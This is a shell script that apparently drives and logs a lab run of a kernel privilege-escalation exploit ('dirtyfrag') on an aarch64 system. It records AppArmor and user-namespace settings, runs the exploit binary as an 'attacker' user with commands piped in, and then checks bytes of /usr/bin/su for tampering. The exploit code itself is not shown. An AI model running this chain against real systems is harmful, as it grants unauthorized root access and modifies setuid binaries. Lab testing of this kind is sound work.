#!/bin/sh
set -eu

echo "=== STOCK_DIRTYFRAG_BUSYBOX_BEGIN $(date -Is) ==="
uname -a
cat /etc/os-release | sed -n '1,8p'
echo "--- ids/profiles ---"
id attacker
sysctl kernel.unprivileged_userns_clone kernel.apparmor_restrict_unprivileged_userns 2>/dev/null || true
sed -n '1,80p' /etc/apparmor.d/busybox 2>/dev/null || true
aa-status 2>/dev/null | sed -n '1,80p' || true

echo "--- binary ---"
ls -l /opt/stock-probes/dirtyfrag-busybox-aarch64
file /opt/stock-probes/dirtyfrag-busybox-aarch64 2>/dev/null || true

echo "--- plain userns should fail ---"
set +e
runuser -u attacker -- sh -lc 'id; unshare -Urn sh -c "id; cat /proc/self/attr/current; grep ^CapEff /proc/self/status"'
echo "plain_rc=$?"

echo "--- dirtyfrag busybox chain ---"
runuser -u attacker -- sh -lc '
  id
  printf "id\ncat /proc/self/status | sed -n \"1,12p\"\ncat /proc/self/attr/current 2>/dev/null || true\nexit\n" |
    DIRTYFRAG_VERBOSE=1 /opt/stock-probes/dirtyfrag-busybox-aarch64 --force-esp -v
  echo exploit_rc=$?
'
echo "runuser_exploit_rc=$?"
set -e

echo "--- post-run su marker ---"
od -An -tx1 -j 120 -N 8 /usr/bin/su 2>/dev/null || true
dmesg | tail -120 || true
echo "=== STOCK_DIRTYFRAG_BUSYBOX_END $(date -Is) ==="
